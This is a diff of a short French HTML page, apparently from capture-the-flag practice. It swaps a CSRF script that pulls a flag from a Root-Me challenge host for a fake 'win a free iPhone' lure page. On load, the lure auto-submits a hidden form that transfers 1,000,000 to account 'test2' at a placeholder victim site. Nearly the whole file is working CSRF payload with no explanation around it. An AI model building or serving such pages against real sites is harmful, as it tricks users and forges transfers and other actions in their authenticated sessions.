@@ -1,31 +1,18 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Attaque CSRF</title>
+    <title>Gagne un iPhone Gratuit 🎁</title>
 </head>
-<body>
-    <h1>Page malveillante</h1>
-    <script>
-        function post(url, params={}) {
-            var params_post = [];
-            for (const key in params) {
-                params_post.push(`${key}=${params[key]}`);
-            }
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", url, false);
-            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-            xhr.send(params_post.join("&"));
-            return xhr.responseText;
-        }
+<body onload="document.getElementById('csrf_form').submit();">
+    <h1>Félicitations, vous avez gagné ! 🎉</h1>
+    <p>Cliquez sur le bouton ci-dessous pour réclamer votre prix :</p>
+    
+    <form id="csrf_form" action="https://victime-site.com/transfer" method="POST">
+        <input type="hidden" name="account" value="test2">
+        <input type="hidden" name="amount" value="1000000">
+    </form>
 
-        function view_flag() {
-            let res = post("http://bankme-1.challenges.pro.root-me.org/flag");
-            alert('Flag récupéré : ' + res);
-        }
-
-        // Appel de la fonction pour récupérer le flag
-        view_flag();
-    </script>
+    <p>Si vous n'êtes pas redirigé, <a href="#" onclick="document.getElementById('csrf_form').submit();">cliquez ici</a>.</p>
 </body>
 </html>
+
